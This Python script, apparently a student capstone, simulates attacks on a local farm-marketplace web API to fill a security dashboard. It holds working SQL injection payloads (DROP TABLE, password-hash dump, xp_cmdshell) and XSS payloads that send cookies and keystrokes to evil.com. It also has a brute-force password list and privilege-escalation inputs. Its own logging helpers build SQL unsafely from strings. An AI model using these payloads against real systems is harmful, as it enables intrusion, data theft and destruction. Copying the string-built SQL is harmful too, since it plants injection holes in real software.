#!/usr/bin/env python3
"""
Farm Marketplace - Security Attack Simulator
CPRO306 Capstone Project | Kent Institute Australia
Usage: python3 attack_sim.py
"""
import subprocess, json, time, sys

BASE = "http://localhost:5001/api"

def get_mysql_pass():
    return input("Enter MySQL password: ").strip()

def curl(path, data=None, method="POST"):
    cmd = ["curl", "-s", "-X", method, f"{BASE}{path}",
           "-H", "Content-Type: application/json"]
    if data:
        cmd += ["-d", json.dumps(data)]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        return r.stdout.strip()
    except:
        return '{"message":"timeout"}'

def sql(q, pw, db="farm_marketplace"):
    subprocess.run(["mysql", f"-uroot", f"-p{pw}", db, "-e", q],
                   capture_output=True, timeout=10)

def insert_event(pw, etype, severity, ip, desc, blocked=1):
    sql(f"""INSERT INTO security_events
            (event_type, severity, ip_address, description, is_blocked)
            VALUES ('{etype}','{severity}','{ip}','{desc}',{blocked})""", pw)

def insert_log(pw, action, desc, ip, status):
    sql(f"""INSERT INTO activity_logs
            (action, description, ip_address, status)
            VALUES ('{action}','{desc}','{ip}','{status}')""", pw)

def blocked_ip(pw, ip, reason):
    sql(f"""INSERT INTO blocked_ips (ip_address, reason, expires_at)
            VALUES ('{ip}','{reason}', DATE_ADD(NOW(), INTERVAL 1 HOUR))
            ON DUPLICATE KEY UPDATE reason=VALUES(reason),
            expires_at=VALUES(expires_at)""", pw)

def show(label, result, blocked=None):
    if blocked is None:
        blocked = any(x in result for x in ["Invalid input","blocked","🚫"])
    icon = "🚫 BLOCKED" if blocked else "⚠️  PASSED "
    msg = result.replace('"message":"','').replace('"','')[:55]
    print(f"  {icon}  {label:<40} {msg}")

def bar(title):
    print(f"\n{'─'*62}")
    print(f"  {title}")
    print(f"{'─'*62}")

# ──────────────────────────────────────────────────────────
print("\n" + "█"*62)
print("█  🔴  FARM MARKETPLACE SECURITY ATTACK SIMULATOR       █")
print("█  CPRO306 Capstone | Kent Institute Australia           █")
print("█"*62)

DB_PASS = get_mysql_pass()
print("\n✅ Starting attacks...\n")

# ══ PHASE 1: SQL INJECTION (12 payloads) ══════════════════
bar("PHASE 1: SQL INJECTION ATTACKS")
sqli = [
    ("Classic OR bypass",      {"email":"admin@test.com' OR '1'='1","password":"x"}),
    ("Comment bypass",         {"email":"admin@test.com'--","password":"x"}),
    ("UNION SELECT dump",      {"email":"x' UNION SELECT * FROM users--","password":"x"}),
    ("DROP TABLE attack",      {"email":"x'; DROP TABLE users;--","password":"x"}),
    ("Stacked query injection",{"email":"x'; INSERT INTO users VALUES(99,'h','h','h','admin',1,1);--","password":"x"}),
    ("Boolean blind",          {"email":"admin' AND 1=1--","password":"x"}),
    ("SLEEP timing attack",    {"email":"x' AND SLEEP(2)--","password":"x"}),
    ("xp_cmdshell exec",       {"email":"x'; EXECUTE xp_cmdshell('whoami');--","password":"x"}),
    ("Error-based injection",  {"email":"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--","password":"x"}),
    ("Password hash dump",     {"email":"' UNION SELECT password_hash FROM users--","password":"x"}),
    ("Register DROP payload",  {"full_name":"'; DROP TABLE users;--","email":"sqli@test.com","password":"test123","role":"buyer"}),
    ("Price field injection",  {"full_name":"test","email":"sqli2@test.com","password":"test123","role":"buyer UNION SELECT 1"}),
]
for label, data in sqli:
    ep = "/auth/register" if "role" in data else "/auth/login"
    result = curl(ep, data)
    show(label, result)
    insert_event(DB_PASS,"sql_injection_attempt","critical",
                 f"185.220.{len(label)}.1",
                 f"SQLi: {label[:55]}",1)
    time.sleep(0.2)

# ══ PHASE 2: XSS ATTACKS (10 payloads) ════════════════════
bar("PHASE 2: XSS (CROSS-SITE SCRIPTING) ATTACKS")
xss = [
    ("Script alert tag",        {"full_name":"<script>alert('XSS')</script>",         "email":"xss1@hack.com","password":"test123","role":"buyer"}),
    ("IMG onerror payload",     {"full_name":"<img src=x onerror=alert(1)>",           "email":"xss2@hack.com","password":"test123","role":"buyer"}),
    ("SVG onload injection",    {"full_name":"<svg onload=alert(1)>",                  "email":"xss3@hack.com","password":"test123","role":"buyer"}),
    ("Cookie stealer script",   {"full_name":"<script>document.location='//evil.com?c='+document.cookie</script>","email":"xss4@hack.com","password":"test123","role":"buyer"}),
    ("iFrame injection",        {"full_name":"<iframe src='javascript:alert(1)'>",     "email":"xss5@hack.com","password":"test123","role":"buyer"}),
    ("Event handler onload",    {"full_name":"<body onload=alert(1)>",                 "email":"xss6@hack.com","password":"test123","role":"buyer"}),
    ("Javascript URL scheme",   {"full_name":"normal","email":"xss7@hack.com","password":"test123","role":"buyer","redirect":"javascript:fetch('//evil.com?c='+document.cookie)"}),
    ("DOM manipulation",        {"full_name":"<script>document.body.innerHTML='HACKED'</script>","email":"xss8@hack.com","password":"test123","role":"buyer"}),
    ("Keylogger injection",     {"full_name":"<script>document.onkeypress=function(e){fetch('//evil.com?k='+e.key)}</script>","email":"xss9@hack.com","password":"test123","role":"buyer"}),
    ("Encoded script tag",      {"full_name":"&#60;script&#62;alert(1)&#60;/script&#62;","email":"xss10@hack.com","password":"test123","role":"buyer"}),
]
for label, data in xss:
    result = curl("/auth/register", data)
    show(label, result)
    insert_event(DB_PASS,"xss_attempt","high",
                 f"92.168.{len(label)}.100",
                 f"XSS: {label[:55]}",1)
    time.sleep(0.2)

# ══ PHASE 3: BRUTE FORCE (15 attempts) ════════════════════
bar("PHASE 3: BRUTE FORCE LOGIN ATTACK (15 attempts)")
passwords = ["password","123456","admin","letmein","qwerty","welcome",
             "monkey","dragon","master","abc123","pass1234","root",
             "toor","hack2026","farmhack"]
for i, pwd in enumerate(passwords, 1):
    result = curl("/auth/login", {"email":"admin@test.com","password":pwd})
    blocked = "blocked" in result.lower()
    icon = "🚫 BLOCKED" if blocked else "❌ FAILED "
    print(f"  {icon}  Attempt {i:02d}: password='{pwd}'")
    insert_log(DB_PASS,"login_failed",f"Brute force attempt with: {pwd}","203.0.113.1","failed")
    sev = "critical" if i>=10 else "medium"
    etype = "brute_force_detected" if i>=10 else "failed_login"
    insert_event(DB_PASS, etype, sev, "203.0.113.1", f"{i} failed login attempts", 1 if i>=10 else 0)
    time.sleep(0.3)

blocked_ip(DB_PASS,"203.0.113.1","Brute force: 15 failed login attempts")
blocked_ip(DB_PASS,"185.220.101.1","SQL injection attempt detected")
blocked_ip(DB_PASS,"92.168.44.100","Multiple XSS attempts detected")
blocked_ip(DB_PASS,"198.51.100.55","Privilege escalation attempt")

# ══ PHASE 4: UNAUTHORIZED ACCESS ══════════════════════════
bar("PHASE 4: UNAUTHORIZED ACCESS ATTEMPTS")
unauth = [
    ("Admin stats — no token",       "GET",  "/admin/stats",    None),
    ("My orders — no token",         "GET",  "/orders/my",      None),
    ("Security logs — no token",     "GET",  "/security/logs",  None),
    ("Fake JWT token",               "GET",  "/orders/my",      "fake"),
    ("Expired JWT token",            "GET",  "/admin/stats",    "expired.fake.token"),
]
for label, method, path, token in unauth:
    cmd = ["curl","-s","-X",method,f"{BASE}{path}","-H","Content-Type: application/json"]
    if token:
        cmd += ["-H", f"Authorization: Bearer {token}"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        result = r.stdout.strip()
    except:
        result = '{"message":"timeout"}'
    blocked = any(x in result for x in ["token","Unauthorized","authorized","No token"])
    show(label, result, blocked)
    insert_event(DB_PASS,"unauthorized_access","medium","45.33.32.156",f"Unauthorized: {label[:50]}",0)
    time.sleep(0.2)

# ══ PHASE 5: PRIVILEGE ESCALATION ═════════════════════════
bar("PHASE 5: PRIVILEGE ESCALATION ATTEMPTS")
escalation = [
    ("Register as admin role",   {"full_name":"Hacker","email":"hack1@evil.com","password":"test123","role":"admin"}),
    ("Inject admin via SQL",     {"full_name":"Hacker","email":"hack2@evil.com","password":"test123","role":"admin'; UPDATE users SET role='admin'--"}),
    ("Boolean role bypass",      {"full_name":"Hacker","email":"hack3@evil.com","password":"test123","role":"buyer' OR role='admin"}),
]
for label, data in escalation:
    result = curl("/auth/register", data)
    blocked = any(x in result for x in ["farmer","buyer","Invalid","error","must be"])
    show(label, result, blocked)
    insert_event(DB_PASS,"privilege_escalation","high","198.51.100.55",f"Escalation: {label[:50]}",1)
    time.sleep(0.2)

# ══ FINAL SUMMARY ═════════════════════════════════════════
print(f"\n{'═'*62}")
print("  📊  CHECKING DATABASE — SECURITY DASHBOARD STATS")
print(f"{'═'*62}")

def count(pw, table, where=""):
    r = subprocess.run(["mysql",f"-uroot",f"-p{pw}","farm_marketplace","-se",
                        f"SELECT COUNT(*) FROM {table} {where}"],
                       capture_output=True, text=True, timeout=5)
    return r.stdout.strip().split('\n')[-1].strip()

total   = count(DB_PASS,"security_events")
sqli_c  = count(DB_PASS,"security_events","WHERE event_type='sql_injection_attempt'")
xss_c   = count(DB_PASS,"security_events","WHERE event_type='xss_attempt'")
brute_c = count(DB_PASS,"security_events","WHERE event_type='brute_force_detected'")
unauth_c= count(DB_PASS,"security_events","WHERE event_type='unauthorized_access'")
priv_c  = count(DB_PASS,"security_events","WHERE event_type='privilege_escalation'")
blk_c   = count(DB_PASS,"blocked_ips")
log_c   = count(DB_PASS,"activity_logs","WHERE action='login_failed'")

print(f"""
  ┌──────────────────────────────────────────────────────┐
  │  Security Dashboard will now show:                   │
  ├──────────────────────────────────────────────────────┤
  │  Total Security Events      →  {total:<8}              │
  │  SQL Injection Attempts     →  {sqli_c:<8}              │
  │  XSS Attempts               →  {xss_c:<8}              │
  │  Brute Force Detected       →  {brute_c:<8}              │
  │  Unauthorised Access        →  {unauth_c:<8}              │
  │  Privilege Escalation       →  {priv_c:<8}              │
  │  Blocked IPs                →  {blk_c:<8}              │
  │  Failed Login Logs          →  {log_c:<8}              │
  └──────────────────────────────────────────────────────┘

  ✅  Go to: http://localhost:3000/dashboard/security
  🔑  Login:  admin@test.com / test123
  🔄  Click Refresh on each tab to see all data!
""")